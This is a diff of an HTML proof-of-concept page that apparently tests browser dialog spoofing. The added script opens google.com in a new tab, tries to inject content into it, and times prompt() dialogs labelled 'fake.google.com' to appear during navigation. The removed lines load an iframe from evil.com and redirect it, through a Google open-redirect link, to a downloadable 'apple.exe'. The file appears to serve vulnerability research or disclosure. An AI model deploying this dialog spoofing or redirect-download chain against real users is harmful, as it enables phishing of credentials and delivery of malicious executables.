@@ -1,7 +1,56 @@
-<iframe id="x" src="https://evil.com"></iframe>
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Strong Windows Browser Dialog Timing PoC</title>
+</head>
+<body style="background:#111;color:#fff;text-align:center;font-family:sans-serif;">
+<h2>Strong Windows Browser Dialog Timing PoC</h2>
+
+<button id="start" style="font-size:22px;padding:12px 24px;">Start Test</button>
+
+<pre id="log" style="color:#0f0; text-align:left; margin:20px auto; width:90%; max-width:800px;"></pre>
+
 <script>
-x.onload = () => {
-  x.contentWindow.location =
-    "https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fapple.exe&sa=D&sntz=1&usg=AOvVaw1T8ZmQt3x7S7E2wgJuyMLe";
+const log = msg => {
+  document.getElementById("log").textContent += msg + "\n";
+  console.log("[PoC]", msg);
+};
+
+document.getElementById("start").onclick = () => {
+  log("[INFO] User gesture received. Preparing PoC...");
+
+  // 1️⃣ Open a new tab/window (top-level navigation)
+  const navWin = window.open("https://www.google.com", "_blank");
+  log("[INFO] New tab opened: google.com");
+
+  // 2️⃣ Inject delayed prompt into new window
+  setTimeout(() => {
+    try {
+      navWin.document.body.innerHTML = '<h1 style="color:red;">Injected PoC</h1>';
+      navWin.prompt(
+        "fake.google.com\n⚠️ Do not sign into your account",
+        ""
+      );
+      log("[BUG] prompt() shown in new window during navigation ❌");
+    } catch(e) {
+      log("[EXPECTED] prompt blocked: " + e.message + " ✔");
+    }
+  }, 150); // small delay to hit navigation timing window
+
+  // 3️⃣ Optional: simulate multiple dialogs in sequence
+  setTimeout(() => {
+    try {
+      navWin.prompt(
+        "Second dialog fake.google.com\n⚠️ Stay alert!",
+        ""
+      );
+      log("[BUG] second prompt shown ❌");
+    } catch(e) {
+      log("[EXPECTED] second prompt blocked ✔");
+    }
+  }, 300);
 };
 </script>
+</body>
+</html>
